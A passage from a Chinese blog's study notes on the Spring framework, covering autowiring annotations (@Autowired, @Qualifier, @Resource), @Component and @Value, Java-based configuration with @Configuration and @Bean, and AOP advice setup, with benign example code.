class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;zeropeach&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></code></pre></div><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>byname要保证所有bean的id唯一并且这个bean需要和自动注入的属性的set方法的值一致</p><p>bytype要保证所有bean的class唯一，并且这个bean需要和自动注入的属性的类型一致</p><h3 id="使用注解进行自动装配"><a href="#使用注解进行自动装配" class="headerlink" title="使用注解进行自动装配"></a>使用注解进行自动装配</h3><h4 id="Autowired和-Qualifier"><a href="#Autowired和-Qualifier" class="headerlink" title="@Autowired和@Qualifier"></a>@Autowired和@Qualifier</h4><p>使用@Qualifier配合使用</p><p>增加</p><div class="code-wrapper"><pre><code class="hljs awk">xmlns:context=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span>xmlns:aop=<span class="hljs-string">&quot;http://www.springframework.org/schema/aop&quot;</span> http:<span class="hljs-regexp">//</span>www.springframework.org<span class="hljs-regexp">/schema/</span>context https:<span class="hljs-regexp">//</span>www.springframework.org<span class="hljs-regexp">/schema/</span>context/spring-context.xsd http:<span class="hljs-regexp">//</span>www.springframework.org<span class="hljs-regexp">/schema/</span>aop https:<span class="hljs-regexp">//</span>www.springframework.org<span class="hljs-regexp">/schema/</span>aop/spring-aop.xsd</code></pre></div><p>关键别忘了<code> &lt;context:annotation-config/&gt;</code>，开启注释</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:aop</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/aop&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/context</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/context/spring-context.xsd</span></span><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/aop</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">context:annotation-config</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dog1&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.Dog&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;cat1&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.Cat&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;people&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.people&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zero.pojo;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">people</span> &#123;    <span class="hljs-meta">@Autowired(required = false)</span> <span class="hljs-comment">//说明可以为空</span>    <span class="hljs-keyword">private</span> Dog dog;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> Cat cat;    <span class="hljs-keyword">private</span> String name;    ......get和set方法&#125;</code></pre></div><p>如果@Autowired自动装配的环境比较复杂，自动装配无法通过一个注解完成的时候，可以<strong>使用@Qualifier配合使用</strong></p><div class="code-wrapper"><pre><code class="hljs routeros">&lt;bean <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;dog1&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;com.zero.pojo.Dog&quot;</span>&gt;&lt;/bean&gt;&lt;bean <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;dog2&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;com.zero.pojo.Dog&quot;</span>&gt;&lt;/bean&gt;&lt;bean <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;cat1&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;com.zero.pojo.Cat&quot;</span>&gt;&lt;/bean&gt;&lt;bean <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;cat2&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;com.zero.pojo.Cat&quot;</span>&gt;&lt;/bean&gt;&lt;bean <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;people&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;com.zero.pojo.people&quot;</span>&gt;&lt;/bean&gt;</code></pre></div><p><img src="/../images/Spring/image-20240120014325047.png" alt="image-20240120014325047"></p><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-selector-tag">package</span> <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.zero</span><span class="hljs-selector-class">.pojo</span>;<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.beans</span><span class="hljs-selector-class">.factory</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.Autowired</span>;<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.beans</span><span class="hljs-selector-class">.factory</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.Qualifier</span>;<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">people</span> &#123;    <span class="hljs-variable">@Autowired</span>(required = false)    <span class="hljs-variable">@Qualifier</span>(value = <span class="hljs-string">&quot;dog1&quot;</span>)    private Dog dog;    <span class="hljs-variable">@Autowired</span>    <span class="hljs-variable">@Qualifier</span>(value = <span class="hljs-string">&quot;cat1&quot;</span>)    private Cat cat;    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">name</span>;。。。。。&#125;</code></pre></div><h4 id="Resource"><a href="#Resource" class="headerlink" title="@Resource"></a>@Resource</h4><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:aop</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/aop&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/context</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/context/spring-context.xsd</span></span><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/aop</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">context:annotation-config</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dog&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.Dog&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;cat&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.Cat&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;people&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.people&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-keyword">package</span> com.zero.pojo;<span class="hljs-keyword">import</span> javax.<span class="hljs-keyword">annotation</span>.Resource;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">people</span> &#123;    <span class="hljs-meta">@Resource(name = <span class="hljs-string">&quot;dog&quot;</span>)</span>    <span class="hljs-keyword">private</span> Dog dog;    <span class="hljs-meta">@Resource(name = <span class="hljs-string">&quot;cat&quot;</span>)</span>    <span class="hljs-keyword">private</span> Cat cat;    <span class="hljs-keyword">private</span> String name;&#125;</code></pre></div><p>小结：</p><p>@Autowired通过ByType方式实现，而且必须要求这个对象存在</p><p>@Resource默认通过ByName方式实现，如果找不到名字，则通过byType实现，都找不到再报错</p><h2 id="使用注解开发"><a href="#使用注解开发" class="headerlink" title="使用注解开发"></a>使用注解开发</h2><h3 id="Component注解"><a href="#Component注解" class="headerlink" title="Component注解"></a>Component注解</h3><p>使用Compnent注解相当于在配置文件中加入<code>&lt;bean class=&quot;com.zero.pojo.User&quot; id=&quot;user&quot;/&gt;</code></p><p>于是配置文件中就可以不用注册bean了，只需要允许component注解即可</p><div class="code-wrapper"><pre><code class="hljs vhdl">&lt;<span class="hljs-keyword">context</span>:<span class="hljs-keyword">component</span>-scan base-<span class="hljs-keyword">package</span>=<span class="hljs-string">&quot;com.zero&quot;</span>&gt;&lt;/<span class="hljs-keyword">context</span>:<span class="hljs-keyword">component</span>-scan&gt;</code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:aop</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/aop&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/context</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/context/spring-context.xsd</span></span><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/aop</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.zero&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">context:component-scan</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">context:annotation-config</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><p>@Value注解来赋值</p><div class="code-wrapper"><pre><code class="hljs typescript">package com.<span class="hljs-property">zero</span>.<span class="hljs-property">pojo</span>;<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">beans</span>.<span class="hljs-property">factory</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">Value</span>;<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">stereotype</span>.<span class="hljs-property">Component</span>;<span class="hljs-meta">@Component</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;    <span class="hljs-meta">@Value</span>(<span class="hljs-string">&quot;zeropeach&quot;</span>)    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name;    <span class="hljs-meta">@Value</span>(<span class="hljs-string">&quot;19&quot;</span>)    <span class="hljs-keyword">private</span> int age;    <span class="hljs-keyword">public</span> <span class="hljs-title class_">User</span>() &#123;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_">String</span> name, int age) &#123;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> name;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setName</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name</span>) &#123;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;    &#125;    <span class="hljs-keyword">public</span> int <span class="hljs-title function_">getAge</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> age;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setAge</span>(<span class="hljs-params">int age</span>) &#123;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">toString</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +                <span class="hljs-string">&quot;, age=&quot;</span> + age +                <span class="hljs-string">&#x27;&#125;&#x27;</span>;    &#125;&#125;</code></pre></div><p>直接获取小写的类名即可</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> com.zero.pojo.Student;<span class="hljs-keyword">import</span> com.zero.pojo.<span class="hljs-keyword">User</span>;<span class="hljs-keyword">import</span> com.zero.pojo.people;<span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> exec &#123;    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) &#123;        ApplicationContext context = <span class="hljs-built_in">new</span> ClassPathXmlApplicationContext(&quot;bean.xml&quot;);        <span class="hljs-keyword">User</span> people = (<span class="hljs-keyword">User</span>) context.getBean(&quot;user&quot;);        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(people.toString());    &#125;&#125;</code></pre></div><p>另外component也是可以自定义id的，<code>component(&quot;&quot;)</code>就可以自定义id的名称</p><p>另外与component等效的还有3种注解，另外三种作用一模一样，但是作用场景不同，是用于区分的：</p><ul><li>@Controller 控制器（注入服务）<br>用于标注控制层，相当于struts中的action层</li><li>@Service 服务（注入dao）<br>用于标注服务层，主要用来进行业务的逻辑处理</li><li>@Repository（实现dao访问）<br>用于标注数据访问层，也可以说用于标注数据访问组件，即DAO组件</li><li>@Component （把普通pojo实例化到spring容器中，相当于配置文件中的 ）</li></ul><h3 id="Scope注解"><a href="#Scope注解" class="headerlink" title="Scope注解"></a>Scope注解</h3><p>和上面一样，单例模式和原型模式</p><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@Component</span>(<span class="hljs-string">&quot;zeero&quot;</span>)<span class="hljs-variable">@Scope</span>(<span class="hljs-string">&quot;singleton&quot;</span>)public class User &#123;    <span class="hljs-variable">@Value</span>(<span class="hljs-string">&quot;zeropeach&quot;</span>)    private String name;    <span class="hljs-variable">@Value</span>(<span class="hljs-string">&quot;19&quot;</span>)    private int age;&#125;</code></pre></div><h2 id="使用java方式配置spring"><a href="#使用java方式配置spring" class="headerlink" title="使用java方式配置spring"></a>使用java方式配置spring</h2><p>即不使用xml配置文件</p><h3 id="Configuration标签和Bean标签"><a href="#Configuration标签和Bean标签" class="headerlink" title="Configuration标签和Bean标签"></a>Configuration标签和Bean标签</h3><p>Configuration标签意思就是<code>&lt;beans&gt;....&lt;/beans&gt;</code>大标签</p><p>然后使用Bean标签就相当于注册bean</p><div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-keyword">package</span> com.zero.config;<span class="hljs-keyword">import</span> com.zero.pojo.User;<span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.Bean;<span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.Configuration;<span class="hljs-meta">@Configuration</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">appconfig</span> &#123;    <span class="hljs-meta">@Bean</span>    <span class="hljs-keyword">public</span> User user123()&#123;        <span class="hljs-keyword">return</span> new User();    &#125;&#125;</code></pre></div><p>函数类型是Bean的class，函数名是Bean的id</p><p>下面的Bean注解代表着bean标签，和component的作用是几乎一样的（有些小区别后面会讲）然后这里bean可以通过<code>bean(&quot;&quot;)</code>指定别名</p><div class="code-wrapper"><pre><code class="hljs typescript">package com.<span class="hljs-property">zero</span>.<span class="hljs-property">pojo</span>;<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">beans</span>.<span class="hljs-property">factory</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">Value</span>;<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">stereotype</span>.<span class="hljs-property">Component</span>;<span class="hljs-meta">@Component</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;    <span class="hljs-meta">@Value</span>(<span class="hljs-string">&quot;zeropeach&quot;</span>)    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name;    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> name;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">toString</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +                <span class="hljs-string">&#x27;&#125;&#x27;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setName</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name</span>) &#123;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;    &#125;&#125;</code></pre></div><p>执行的话，这里要换一个上下文，从<code>ClassPathXmlApplicationContext</code>换为<code>AnnotationConfigApplicationContext</code></p><p><img src="/../images/Spring/image-20240120182810263.png" alt="image-20240120182810263"></p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> com.zero.config.appconfig;<span class="hljs-keyword">import</span> com.zero.pojo.<span class="hljs-keyword">User</span>;<span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<span class="hljs-keyword">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> exec &#123;    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) &#123;        ApplicationContext context = <span class="hljs-built_in">new</span> AnnotationConfigApplicationContext(appconfig.<span class="hljs-keyword">class</span>);  //获取配置文件的<span class="hljs-keyword">class</span>        <span class="hljs-keyword">User</span> <span class="hljs-keyword">user</span> = (<span class="hljs-keyword">User</span>) context.getBean(&quot;user123&quot;);  //函数名        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">user</span>.toString());    &#125;&#125;</code></pre></div><h3 id="ComponentScan标签"><a href="#ComponentScan标签" class="headerlink" title="ComponentScan标签"></a>ComponentScan标签</h3><p>相当于xml配置文件中的<code>&lt;context:component-scan base-package=&quot;com.zero&quot;/&gt;</code></p><p><img src="/../images/Spring/image-20240120184430262.png" alt="image-20240120184430262"></p><h3 id="Import标签"><a href="#Import标签" class="headerlink" title="Import标签"></a>Import标签</h3><p>导入其他配置类</p><h3 id="component和bean标签的异同"><a href="#component和bean标签的异同" class="headerlink" title="component和bean标签的异同"></a>component和bean标签的异同</h3><p><a href="https://www.cnblogs.com/konglxblog/p/16441424.html">https://www.cnblogs.com/konglxblog/p/16441424.html</a></p><p><img src="/../images/Spring/image-20240120184603928.png" alt="image-20240120184603928"></p><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p><a href="https://juejin.cn/post/6844903978342301709#heading-11">https://juejin.cn/post/6844903978342301709#heading-11</a></p><p>InvocationHandler接口</p><p>Proxy.newProxyInstance</p><p><img src="/../images/Spring/image-20240120203147891.png" alt="image-20240120203147891"></p><h2 id="aop实现的三种方式"><a href="#aop实现的三种方式" class="headerlink" title="aop实现的三种方式"></a>aop实现的三种方式</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><div class="code-wrapper"><pre><code class="hljs pgsql">package com.boogipop.cutface;<span class="hljs-keyword">import</span> org.springframework.aop.MethodBeforeAdvice;<span class="hljs-keyword">import</span> java.lang.reflect.<span class="hljs-keyword">Method</span>;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> <span class="hljs-keyword">Before</span> implements MethodBeforeAdvice &#123;    @Override    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">before</span>(<span class="hljs-keyword">Method</span> <span class="hljs-keyword">method</span>, <span class="hljs-keyword">Object</span>[] args, <span class="hljs-keyword">Object</span> target) throws Throwable &#123;        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Before&quot;);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs pgsql">package com.boogipop.cutface;<span class="hljs-keyword">import</span> org.springframework.aop.AfterReturningAdvice;<span class="hljs-keyword">import</span> java.lang.reflect.<span class="hljs-keyword">Method</span>;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> <span class="hljs-keyword">After</span> implements AfterReturningAdvice &#123;    @Override    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> afterReturning(<span class="hljs-keyword">Object</span> returnValue, <span class="hljs-keyword">Method</span> <span class="hljs-keyword">method</span>, <span class="hljs-keyword">Object</span>[] args, <span class="hljs-keyword">Object</span> target) throws Throwable &#123;        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;After&quot;);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:p</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/p&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:aop</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/aop&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/beans/spring-beans-4.1.xsd</span></span><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/context</span></span><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/context/spring-context-4.1.xsd</span></span><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.1.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;after&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.boogipop.cutface.After&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;before&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.boogipop.cutface.Before&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;simple&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.boogipop.service.SimpleImpl&quot;</span>/&gt;</span><span class="hljs-comment">&lt;!--开始配置aop--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">aop:config</span>&gt;</span><span class="hljs-comment">&lt;!--定义切入点--&gt;</span><span class="hljs-comment">&lt;!-- 执行环绕增加 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">aop:pointcut</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;point&quot;</span> <span class="hljs-attr">expression</span>=<span class="hljs-string">&quot;execution(* com.boogipop.service.SimpleImpl.*(..))&quot;</span>/&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">aop:advisor</span> <span class="hljs-attr">advice-ref</span>=<span class="hljs-string">&quot;before&quot;</span> <span class="hljs-attr">pointcut-ref</span>=<span class="hljs-string">&quot;point&quot;</span>/&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">aop:advisor</span> <span class="hljs-attr">advice-ref</span>=<span class="hljs-string">&quot;after&quot;</span> <span class="hljs-attr">pointcut-ref</span>=<span class="hljs-string">&quot;point&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">aop:config</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><p>关于切点的表达式</p><p><a href="https://blog.csdn.net/ABCD898989/article/details/50809321">https://blog.csdn.net/ABCD898989/article/details/50809321</a><br><a href="https://blog.csdn.net/loongshawn/article/details/72303040">https://blog.csdn.net/loongshawn/article/details/72303040</a></p><h3 id="2-自定义切面类"><a href="#2-自定义切面类" class="headerlink" title="2   自定义切面类"></a>2   自定义切面类</h3><div class="code-wrapper"><pre><code class="hljs csharp">package com.boogipop.cutface;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Selfcut</span> &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">after</span>()</span>&#123;        System.<span class="hljs-keyword">out</span>.println(<span 